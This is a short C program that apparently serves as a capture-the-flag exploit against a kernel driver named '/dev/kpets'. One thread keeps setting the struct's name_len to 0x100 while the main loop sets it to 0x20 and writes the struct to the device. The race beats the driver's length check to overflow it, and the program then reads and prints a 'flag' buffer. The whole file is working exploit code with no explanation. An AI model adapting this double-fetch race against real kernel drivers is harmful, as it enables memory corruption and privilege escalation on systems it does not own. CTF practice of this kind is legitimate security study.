#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <pthread.h>
#include <unistd.h>

typedef struct _pet{
    char type;
    int name_len;
    char name[0x20];
    int desc_len;
    char desc[0x40];
    char next_type;
}pet;

char flag[0x40];
pthread_t attacker;
pet hunter;

static void * attack(){
    while(1){
        hunter.name_len=0x100;
    }
}

int main(){
   int fd = open("/dev/kpets",O_RDWR);

   hunter.type = 0xc2;
   hunter.next_type = 0xaa;

   pthread_create(&attacker,NULL,&attack,NULL);

   for(int i=0;i<100;i++){
       hunter.name_len=0x20;
       write(fd,&hunter,0x70);
       read(fd,&flag,0x40);
       printf("%s",flag);
   }
}